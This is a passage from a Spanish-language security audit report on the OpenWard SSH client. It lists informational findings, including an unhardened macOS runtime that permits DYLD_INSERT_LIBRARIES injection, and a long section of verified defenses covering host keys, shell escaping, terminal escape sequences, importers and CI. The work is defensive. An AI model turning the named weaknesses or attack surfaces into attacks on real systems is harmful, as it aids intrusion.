- **Relación:** BR-4 (solo macOS) y BR-10.

### CI-12 · Informativos de build y publicación
- **Gravedad:** Informativa
- **Datos personales en el historial:** los commits y tags anotados del mantenedor llevan su correo personal como autor, y ninguno va firmado. Al publicar el repositorio quedará expuesto, y solo se cambia reescribiendo los SHA: decidirlo antes, usar el correo `noreply` para lo que venga y firmar los tags de release.
- **macOS sin Hardened Runtime** (`app/macos/Runner.xcodeproj/project.pbxproj`): `DYLD_INSERT_LIBRARIES` funciona y lo inyectado heredaría los permisos de TCC de OpenWard; pide ser el mismo usuario. Al firmar, `-o runtime` sin `disable-library-validation`, `allow-unsigned-executable-memory` ni `allow-jit` en Release (`allow-jit` ya solo está en `DebugProfile.entitlements`).
- **`subosito/flutter-action`** (fijada por SHA) usa por dentro `actions/cache@v5` por tag y baja el SDK de Flutter sin comprobar su SHA-256.
- **`.gitignore`:** no ignora los datos de la app si `OPENWARD_DATA` apunta dentro del repositorio (`vault.db`, `logs/*.cast.gz`, `settings.json`); `!core/crates/openward-import/tests/fixtures/**` anula los patrones de secretos dentro de esa carpeta; faltan `*.p8`, `*.cer`, `*.mobileprovision`, `*.provisionprofile` y `cargokit_options.yaml`.
- **Imágenes de prueba y spikes:** las bases de los servidores S2 van por tag, dependabot no tiene ecosistema `docker`, y el `Cargo.lock` de `spikes/s2-ssh/sshprobe` sigue con RUSTSEC-2026-0385, RUSTSEC-2026-0387 y RUSTSEC-2026-0386 (tokio). No se distribuye nada de eso.

## Comprobado que está bien

Para que conste qué se miró, con la defensa que lo sostiene:

- **Conexión:** la clave del host se verifica al final del intercambio y antes de `authenticate` (`connect.rs:247-258`); cada salto con su `KnownHosts` y el nombre configurado (`connect.rs:217-237`, `client.rs:603-615`); `Changed`, `Revoked` y `BadCertificate` nunca se aceptan, `OtherType` pregunta también con «Aceptar nuevas» (`connect.rs:279-290`); certificados: tipo host, CA limitada a su patrón, validez y principales (`known_hosts.rs:286-334`); cada respuesta a su pregunta por id y sin respuesta es cancelar (`events.rs:420-450`); `HostKeyChanged` no se reintenta (`lib.rs:172-205`).
- **ProxyCommand y órdenes en el servidor:** `shell_safe` cubre comillas, `` ` $ \ ; & | < > ( ) { } ^ % ! * ? [ ] ~ # ``, espacios Unicode, controles y el `-` inicial (`local.rs:87-160`); tmux y os-release son constantes o un nombre generado (`lib.rs:686-714`, `system.rs:14`), con `exec_short` a 64 KiB.
- **Algoritmos y canales:** russh 0.64.1 sin `none`, CBC, MAC SHA-1 ni grupo 1, GEX desde 3072 bits y strict KEX; el agente solo al último salto; `forwarded-tcpip` solo a puertos registrados (`client.rs:311-342`); túneles en loopback de serie (`tunnels.rs:156-179`); ni X11 ni `SendEnv`; el proxy lee con límites (`proxy.rs:20-216`).
- **Terminal:** `engine.rs:309-395` no activa el informe del título, DECRQCRA, el portapapeles (OSC 52, 1337, 5522), notificaciones, ENQ ni PWD; XTGETTCAP responde un mapa fijo; el pegado cambia los controles por espacios (`paste.zig:54-98`) y `encode_text` descarta los C0 (`input.rs:283-306`); enlaces con modificador y lista de esquemas (`terminal_pane.dart:742-763`, `links.dart:16`); el título del programa solo en terminales locales (`controller.dart:155-159`); frames acotados y un frame malo pide uno entero (`frame.rs:189-195`, `frame.dart:182-203`); `unsafe` correcto en `openward-ghostty` (`engine.rs:207,1314-1328`) y `openward-pty` (`lib.rs:254-261`).
- **Importadores:** `Match` distinto de `all` no se evalúa, así que `Match exec` no ejecuta nada (`ssh_config.rs:430-438`); `LocalCommand`, `KnownHostsCommand` y `RemoteCommand` no se importan; `StrictHostKeyChecking no` pasa a «Aceptar nuevas» con aviso; el ProxyCommand y los comandos al conectar de otros programas solo van al informe; quick-xml no expande DTD (sin XXE ni billion laughs); lecturas de archivos normales de hasta 64 MiB (`files.rs:11-33`).
- **Claves y vault:** nombres de clave nuevos limitados a `[A-Za-z0-9._@-]` (`keychain.rs:209-226`); borrar, renombrar y cambiar la frase solo dentro de `~/.ssh` (`keychain.rs:230-236`); claves nuevas con `create_new` y 0600; cambio de frase con temporal 0600 y `Zeroizing`; RSA de 4096; la clave pública se instala por SFTP, sin shell; todas las consultas SQL con parámetros; `vault.db`, `-wal`, `-shm` y el candado en 0600; las funciones de prueba de la FFI se niegan en release (`app.rs:168-177`).
- **SFTP y terminal local:** `is_name` en `read_dir` (`lib.rs:96-98`, `remote.rs:129`) y `local_join` en todas las bajadas (`transfer.rs:827-837`); los gemelos de mayúsculas en serie; un enlace remoto a carpeta no se sigue; los `.part` con id del origen y cancelar solo borra los propios; las bajadas nunca abren ni ejecutan nada; el hijo del PTY sin descriptores del vault ni sockets (`CLOEXEC` y `close_random_fds`), con `setsid` y `TIOCSCTTY`.
- **Registros:** solo `ChannelMsg::Data`/`ExtendedData` y la salida del PTY (`terminal.rs:203-212,780`); lo tecleado va por `send()`, que no toca el registro; el seguidor de línea descarta prompts de contraseña y lo que no se ve; carpeta fija (`lib.rs:80`), 0700, y archivos con `O_CREAT` 0600; la FFI por el mapa `entries`, sin rutas; solo se borran `{id}.cast.gz`, `{id}.txt.gz` y `{id}.json`; el reproductor tira las respuestas (`terminal.rs:215-218`).
- **CI y cadena de suministro:** sin `pull_request_target`, `workflow_run` ni `issue_comment`; `contents: read` de serie; ninguna expresión `${{ }}` dentro de `run:`; las acciones fijadas por SHA coinciden con sus tags; Zig en la CI con SHA-256 (`install-zig.sh:6-30`); Ghostty por commit de 40 caracteres y sus dependencias con `.hash`; `Cargo.lock` solo con crates.io (`unknown-git = "deny"`); sin binarios precompilados en `cargokit.yaml`; ningún esquema de URL ni tipo de documento registrado, y los argumentos de línea de órdenes no se usan; BR-4 sigue en `package-macos.sh:33-46`.
- **Secretos:** ninguna clave privada, token, `.env` ni certificado real en los 2457 blobs del historial; los marcadores `BEGIN OPENSSH PRIVATE KEY` son código o datos falsos de prueba; las claves de los servidores S2 se generan al vuelo fuera del repositorio y sus puertos solo escuchan en 127.0.0.1; los vaults de prueba solo tienen datos inventados (example.com, 10.0.0.x).
